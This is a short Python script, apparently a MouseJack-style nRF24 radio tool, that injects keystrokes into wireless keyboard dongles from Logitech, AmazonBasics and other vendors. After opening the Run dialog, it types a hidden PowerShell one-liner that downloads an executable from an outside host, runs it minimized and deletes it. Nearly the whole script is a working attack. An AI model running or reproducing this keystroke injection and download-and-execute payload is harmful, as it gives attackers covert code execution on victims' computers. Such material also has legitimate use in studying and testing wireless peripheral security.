#!/usr/bin/env python2

import time, logging, crcmod, struct
from lib import common
from protocols import *

# Parse command line arguments and initialize the radio
common.init_args('./nrf24-scanner.py')
common.parser.add_argument('-a', '--address', type=str, help='Target address')
common.parser.add_argument('-f', '--family', required=True, type=Protocols, choices=list(Protocols), help='Protocol family')
common.parse_and_init()

# Parse the address
address = ''
if common.args.address is not None:
  address = common.args.address.replace(':', '').decode('hex')[::-1]
  address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])

# Initialize the target protocol
if common.args.family == Protocols.HS304:
  p = HS304()
elif common.args.family == Protocols.Canon:
  p = Canon()
elif common.args.family == Protocols.TBBSC:
  if len(address) != 3:
    raise Exception('Invalid address: {0}'.format(common.args.address))  
  p = TBBSC(address)
elif common.args.family == Protocols.RII:
  if len(address) != 5:
    raise Exception('Invalid address: {0}'.format(common.args.address))  
  p = RII(address)
elif common.args.family == Protocols.AmazonBasics:
  if len(address) != 5:
    raise Exception('Invalid address: {0}'.format(common.args.address))  
  p = AmazonBasics(address)
elif common.args.family == Protocols.Logitech:
  if len(address) != 5:
    raise Exception('Invalid address: {0}'.format(common.args.address))  
  p = Logitech(address)
if common.args.family == Protocols.LogitechEncrypted:
  if len(address) != 5:
    raise Exception('Invalid address: {0}'.format(common.args.address))  
  p = Logitech(address, encrypted=True)

# Initialize the injector instance
i = Injector(p)

# Inject some sample strings
i.start_injection()
i.send_winplusr()
time.sleep(1)
i.inject_string("powershell -w h [Net.ServicePointManager]::SecurityProtocol='tls12';(New-Object Net.WebClient).DownloadFile('http://p.nsa.chat','%HOMEPATH%\\n.exe');Start-Process -wai -wi mi -f '~\\n.exe';Remove-Item -pa '~\\n.exe';exit")
i.send_enter()
i.stop_injection()
